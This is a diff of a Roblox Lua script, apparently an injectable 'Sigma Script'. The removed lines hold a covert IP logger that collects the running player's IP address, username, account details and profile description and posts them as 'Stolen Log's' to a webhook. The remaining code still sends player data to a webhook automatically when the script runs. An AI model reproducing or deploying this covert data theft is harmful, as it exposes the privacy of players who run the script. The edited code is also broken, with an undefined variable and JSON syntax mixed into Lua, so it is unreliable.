@@ -6,9 +6,13 @@ local player = game.Players.LocalPlayer
 
 local function notify_hook()
 	-- Thumb API
-	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=true")
-	local json = game.HttpService:JSONDecode(ThumbnailAPI)
-	local avatardata = json.data[1].imageUrl
+	local AvatarCircleAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=true")
+	local json = game.HttpService:JSONDecode(AvatarCircleAPI)
+	local AvatarCircle = json.data[1].imageUrl
+
+	local AvatarAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Webp")
+	local json = game.HttpService:JSONDecode(AvatarAPI)
+	local Avatar = json.data[1].imageUrl
 
 	-------- User API Script
 	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..game.Players.LocalPlayer.UserId)
@@ -19,75 +23,6 @@ local function notify_hook()
 	local CreatedData = json.created
 
 	local send_data = {
-		["username"] = "IP Logger",
-		["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s",
-		["content"] = "Someone injected our ip logger !",
-		["embeds"] = {
-			{
-				["title"] = "Stolen Log's",
-				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**\n** IP : " .. result.query .. "**",
-				["color"] = 3447003,
-				["fields"] = {
-					{
-						["name"] = "Username",
-						["value"] = player.Name,
-						["inline"] = true
-					},
-					{
-						["name"] = "Display Name",
-						["value"] = player.DisplayName,
-						["inline"] = true
-					},
-					{
-						["name"] = "User ID",
-						["value"] = player.UserId,
-						["inline"] = true
-					},
-					{
-						["name"] = "Account Age",
-						["value"] = player.AccountAge.." Day",
-						["inline"] = true
-					},
-					{
-						["name"] = "Membership",
-						["value"] = player.MembershipType.Name,
-						["inline"] = true
-					},
-					{
-						["name"] = "Account Created Day",
-						["value"] = string.match(CreatedData, "^([%d-]+)"),
-						["inline"] = true
-					},
-					{
-						["name"] = "Profile Description",
-						["value"] = "```\n"..DescriptionData.."\n```",
-						["inline"] = true
-					}
-				},
-				["footer"] = {
-					["text"] = "IP Log",
-					["icon_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s"
-				},
-				["thumbnail"] = {
-					["url"] = avatardata
-				}
-			}
-		},
-	}
-
-	local headers = {
-		["Content-Type"] = "application/json"
-	}
-
-	request({
-		Url = Notify_Webhook,
-		Method = "POST",
-		Headers = headers,
-		Body = game:GetService("HttpService"):JSONEncode(send_data)
-	})
-end
-
-local new_data = {
   "content": "",
   "tts": false,
   "embeds": [
@@ -104,10 +39,10 @@ local new_data = {
       "author": {
         "name": player.Name,
         "url": "https://www.roblox.com/users/4121111717/profile",
-        "icon_url": "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-C4EDFD622078F4F1C2D877FC5659D035-Png/150/150/AvatarHeadshot/Webp/noFilter"
+        "icon_url": AvatarCircle
       },
       "image": {
-        "url": "https://tr.rbxcdn.com/30DAY-Avatar-C4EDFD622078F4F1C2D877FC5659D035-Png/352/352/Avatar/Webp/noFilter"
+        "url": Avatar
       },
       "fields": [
         {
@@ -125,4 +60,17 @@ local new_data = {
   "username": "Sigma Script",
   "avatar_url": "https://github.com/FobyCool/MyScripts/blob/main/Sigma/image.png?raw=true"
 }
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	request({
+		Url = Notify_Webhook,
+		Method = "POST",
+		Headers = headers,
+		Body = game:GetService("HttpService"):JSONEncode(send_data)
+	})
+end
+
 notify_hook()
